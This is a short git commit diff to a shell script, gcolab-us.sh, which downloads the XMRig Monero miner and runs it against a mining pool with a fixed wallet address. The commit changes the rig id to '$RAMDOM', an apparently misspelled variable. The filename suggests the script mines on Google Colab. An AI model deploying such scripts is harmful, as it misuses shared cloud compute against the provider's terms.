5c5e91d15e5ce4d07ea8b1f117a17fde46cdb759
Xia Shi Wei <meaningfulnesses@gmail.com>
2022-03-13 20:07:03 +1000

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 43FS7CfZ8Mi6U6KFVrKSQ9Ln3XrJP6eNHTQrqXsuahaUCTaVKFazmCMKJsbzHQxjaofSpBAgLY2U99qCEMCVhEpGHw2CF2Y -k --tls --rig-id GC-US
+./xmrig -o us-west.minexmr.com:443 -u 43FS7CfZ8Mi6U6KFVrKSQ9Ln3XrJP6eNHTQrqXsuahaUCTaVKFazmCMKJsbzHQxjaofSpBAgLY2U99qCEMCVhEpGHw2CF2Y -k --tls --rig-id $RAMDOM
